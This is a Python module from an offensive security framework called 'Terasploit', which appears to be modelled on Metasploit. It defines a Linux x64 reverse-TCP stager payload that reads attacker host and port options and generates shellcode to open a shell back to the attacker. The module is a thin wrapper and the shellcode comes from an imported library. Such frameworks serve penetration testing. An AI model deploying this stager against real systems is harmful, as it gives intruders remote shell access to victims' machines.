"""
Terasploit Framework (c) 2026

Author:          4steroth
License:         BSD-3-Clause
Path:            modules/payload/stagers/linux/x64/shell/reverse_tcp.py
"""

from teralibs.tsf.base.payload import ARCH_X64, PLATFORM_LINUX, STAGER, Payload, PayloadHandler
from teralibs.tsf.core.payload.linux.x64.reverse_tcp import ReverseTcpX64


class TerasploitModule(ReverseTcpX64, Payload):
    """Linux x64 reverse-TCP stager."""

    NAME = "Linux x64 Reverse TCP Stager"
    DESCRIPTION = (
        "Linux x86-64 stager that opens a reverse TCP channel to the attacker "
        "and executes the companion stage delivered by the framework."
    )
    AUTHOR = "4steroth"
    LICENSE = "BSD-3-CLAUSE"
    VERSION = "1.1"
    RANK = "normal"

    REFERENCES = [
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "modules/payloads/stagers/linux/x64/reverse_tcp.rb",
        "https://github.com/rapid7/metasploit-framework/blob/master/"
        "lib/msf/core/payload/linux/x64/reverse_tcp.rb",
    ]

    PAYLOAD_TYPE = STAGER
    HANDLER = PayloadHandler.ReverseTCP

    # Companion stage: modules/payload/stages/linux/x64/shell.py
    STAGE_PATH = "linux.x64.shell"

    CACHED_SIZE = 130
    MAX_SIZE = 300

    ARCH = [ARCH_X64]
    PLATFORM = [PLATFORM_LINUX]

    OPTIONS = ["LHOST", "LPORT", "EXITFUNC"]

    def generate(self, ctx):
        """
        Generate the Linux x64 reverse-TCP stager shellcode.
        """
        host = ctx.get_option("LHOST")
        port = int(ctx.get_option("LPORT"))

        exitfunc = str(ctx.get_option("EXITFUNC") or "process").lower().strip()
        shellcode = self.generate_reverse_tcp(
            host_option=(host, port, exitfunc),
        )

        return self.apply_prepends(shellcode, ctx)
